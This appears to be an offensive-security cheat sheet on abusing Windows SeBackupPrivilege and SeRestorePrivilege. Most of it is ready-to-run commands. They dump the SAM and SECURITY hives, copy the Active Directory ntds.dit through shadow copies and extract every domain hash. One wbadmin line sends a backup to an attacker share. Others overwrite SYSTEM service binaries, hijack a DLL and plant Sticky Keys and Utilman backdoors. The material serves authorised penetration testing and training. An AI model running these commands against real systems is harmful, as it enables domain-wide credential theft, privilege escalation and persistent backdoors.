---
title: 'SeBackup & SeRestore Privileges'
description: 'Exploiting SeBackupPrivilege and SeRestorePrivilege for file access bypass — SAM extraction, ntds.dit dumping via diskshadow, and arbitrary file write.'
---

# SeBackup & SeRestore Privileges

## SeBackupPrivilege

### When You See This

- Members of the **Backup Operators** group
- Backup software service accounts
- Explicitly assigned via GPO

```cmd
whoami /priv | findstr SeBackup
```

### What It Allows

Read **any file** on the system, bypassing all DACL access checks. The OS treats reads as backup operations, ignoring file permissions entirely.

---

### Method 1: Registry Hive Export (Quick — Local Hashes)

```cmd
:: Export SAM, SYSTEM, SECURITY hives
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY
```

```bash
# On attacker: extract local user hashes
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

**Output format**: `username:RID:LMhash:NThash:::`

---

### Method 2: diskshadow + robocopy (Domain Controllers — ntds.dit)

`ntds.dit` is the Active Directory database. It's locked by the DSA (Directory System Agent) process and **cannot be copied directly**. You must use Volume Shadow Copy Service (VSS) to create a snapshot.

**Step 1 — Create the diskshadow script** (`C:\temp\shadow.txt`):

```
set context persistent nowriters
add volume c: alias pwned
create
expose %pwned% z:
```

**Step 2 — Execute the shadow copy**:

```cmd
diskshadow.exe /s C:\temp\shadow.txt
```

**Step 3 — Copy ntds.dit from the shadow volume**:

```cmd
:: /b flag = backup mode (uses SeBackupPrivilege to bypass ACLs)
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

**Step 4 — Get the SYSTEM hive** (needed for decryption):

```cmd
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

**Step 5 — Transfer to attacker and extract ALL domain hashes**:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

**Step 6 — Clean up**:

```cmd
diskshadow.exe
DISKSHADOW> delete shadows all
DISKSHADOW> exit
```

!!! tip "diskshadow Requires Interactive Session"
    `diskshadow.exe` needs an interactive session. If you only have a reverse shell, use `wbadmin` instead (Method 3) or try `vssadmin` directly.

---

### Method 3: wbadmin (Windows Server Backup)

```cmd
:: Create backup of NTDS volume
wbadmin start backup -backuptarget:\\ATTACKER\share -include:C:\Windows\NTDS -quiet

:: Restore specific files
wbadmin start recovery -version:BACKUP_VERSION -items:C:\Windows\NTDS\ntds.dit -recoverytarget:C:\temp -quiet
```

---

### Method 4: vssadmin (Direct VSS)

```cmd
:: Create a shadow copy
vssadmin create shadow /for=C:

:: Note the Shadow Copy Volume Name (e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1)
:: Copy ntds.dit from it
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit

:: Clean up
vssadmin delete shadows /shadow={SHADOW_ID} /quiet
```

---

### Method 5: BackupOperatorToDA (Automated)

PowerShell script that automates the entire Backup Operators → Domain Admin chain.

**Repo**: [github.com/mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)

```powershell
Import-Module .\BackupOperatorToDA.ps1
Invoke-BackupOperatorToDA -TargetDC DC01 -OutputPath C:\temp
```

---

## SeRestorePrivilege

### What It Allows

Write **any file** on the system, bypassing all DACL access checks. You can overwrite protected system files.

```cmd
whoami /priv | findstr SeRestore
```

### Exploitation Techniques

#### Replace Service Binary

```cmd
:: Find a service running as SYSTEM
sc qc TargetService

:: Overwrite its binary (SeRestore bypasses file permissions)
copy /Y C:\temp\payload.exe "C:\Program Files\TargetApp\service.exe"

:: Restart service
sc stop TargetService
sc start TargetService
```

#### DLL Hijack via File Write

```cmd
:: Place a malicious DLL where a SYSTEM service will load it
copy C:\temp\evil.dll "C:\Windows\System32\wlbsctrl.dll"

:: Restart the IKEEXT service (loads wlbsctrl.dll)
sc stop IKEEXT
sc start IKEEXT
```

#### RDP Backdoor (Sticky Keys / Utilman)

```cmd
:: Replace utilman.exe with cmd.exe
:: Press Win+U on RDP login screen = SYSTEM shell
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe /Y

:: Or replace sethc.exe (Sticky Keys)
:: Press Shift 5 times on login screen = SYSTEM shell
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /Y
```

---

## Hashes You Can Extract

| Source | Contains | Scope |
|:-------|:---------|:------|
| `SAM` hive | Local user NTLM hashes | Local machine only |
| `SECURITY` hive | LSA secrets, cached domain creds (DCC2) | Recent domain logins |
| `SYSTEM` hive | Boot key (SysKey) for decryption | Required for SAM/ntds.dit |
| `ntds.dit` | **ALL domain user NTLM hashes** | Entire Active Directory domain |
